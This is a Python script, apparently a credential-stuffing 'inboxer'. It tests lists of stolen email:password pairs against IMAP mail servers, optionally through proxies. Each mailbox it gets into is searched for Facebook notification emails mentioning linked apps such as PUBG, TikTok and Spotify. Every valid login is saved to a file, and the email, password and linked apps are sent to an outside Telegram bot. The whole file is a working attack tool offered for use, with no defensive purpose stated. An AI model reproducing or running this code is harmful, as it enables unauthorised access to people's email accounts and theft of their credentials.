import os, random, time, requests, ssl, asyncio, aioimaplib, email
from datetime import datetime
from colorama import Fore, Style, init
init(autoreset=True)

# رنگە random
def rand_color(text):
    return random.choice([Fore.RED, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW]) + text + Style.RESET_ALL

# دامەزراندنی user
print(rand_color("Enter your bot token: "), end="")
bot_token = input()
print(rand_color("Enter your Telegram ID: "), end="")
telegram_id = input()
print(rand_color("Enter your name: "), end="")
user_name = input()
print(Fore.GREEN + f"Welcome {user_name} To Script 'Mr.Diyar'")

# دەروازەی سەرەکی
print("\n" + rand_color("Check With Combo Email:Password or ID:Password"))
combo_path = input(rand_color("Enter your combo file: "))
with open(combo_path, "r", encoding="utf-8") as f:
    combos = [line.strip() for line in f if line.strip()]

proxy = input(rand_color("Proxy Support [Yes,No]: ")).strip().lower()
proxies = []
if proxy == "yes":
    proxy_path = input(rand_color("Enter your proxy file: "))
    with open(proxy_path, "r", encoding="utf-8") as f:
        proxies = [line.strip() for line in f if line.strip()]

diyar = "notification@facebookmail.com"
KEYWORDS = ["Spotify", "PUBG", "Pubg", "8 Ball Pool", "TikTok", "Instagram", "Twitter", "Pinterest", 
            "Roblox", "FreeFire", "Free Fire", "Twitch", "Shahid", "AliExpress", "Bumble", "Badoo", 
            "Canva", "Duolingo"]

hits = 0
bad = 0
lock = asyncio.Lock()

def diyarIMAP(email):
    domain = email.split("@")[-1].lower()
    if "gmail" in domain:
        return "imap.gmail.com"
    elif "yahoo" in domain:
        return "imap.mail.yahoo.com"
    elif "hotmail" in domain or "outlook" in domain:
        return "imap-mail.outlook.com"
    else:
        return "imap." + domain

def anasSubj(text):
    try:
        from email.header import decode_header
        subject, encoding = decode_header(text)[0]
        if isinstance(subject, bytes):
            return subject.decode(encoding or 'utf-8', errors='ignore')
        return subject
    except:
        return text

async def send_hit_to_telegram(name, email, password, apps):
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""Hit Facebook Inboxer

name : {name}
email : {email}
password : {password}
Apps Linked = [{apps}]
Time : {time_now}
"""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": telegram_id, "text": message}
    try:
        requests.post(url, data=data)
    except:
        pass

async def diyarCheck(email_address, password, combo):
    global hits, bad
    imap_server = diyarIMAP(email_address)
    ssl_context = ssl.create_default_context()
    try:
        client = aioimaplib.IMAP4_SSL(host=imap_server, ssl_context=ssl_context)
        await client.wait_hello_from_server()
        await client.login(email_address, password)
        await client.select("INBOX")
        search_cmd = f'(FROM "{diyar}")'
        search = await client.search(search_cmd)
        msg_nums = search.lines[0].decode().split()
        found_keywords = set()
        for num in msg_nums:
            resp = await client.fetch(num, '(RFC822)')
            if resp.result != 'OK':
                continue
            raw_msg = b''.join(resp.lines[1:-1])
            msg = email.message_from_bytes(raw_msg)
            subject = anasSubj(msg.get("Subject", ""))
            for word in KEYWORDS:
                if word.lower() in subject.lower():
                    found_keywords.add(word)
        async with lock:
            if found_keywords:
                apps = ", ".join(sorted(found_keywords))
                with open("/sdcard/Facebook-Hits.txt", "a", encoding="utf-8") as f:
                    f.write(f"{combo} | Apps Linked = [{apps}]\n")
                await send_hit_to_telegram("Facebook User", email_address, password, apps)
                print(rand_color(f"[HIT] {combo} | Apps = {apps}"))
                hits += 1
            else:
                print(Fore.YELLOW + f"[NO INBOX] {combo}")
                bad += 1
        await client.logout()
    except Exception as e:
        async with lock:
            print(Fore.RED + f"[BAD] {combo} -> {str(e)}")
            bad += 1

async def main():
    tasks = []
    for line in combos:
        if ':' not in line: continue
        email, password = line.split(":", 1)
        tasks.append(diyarCheck(email, password, line))
    await asyncio.gather(*tasks)
    print(rand_color(f"\nTotal Hits: {hits} | Bad: {bad}"))

if __name__ == "__main__":
    asyncio.run(main())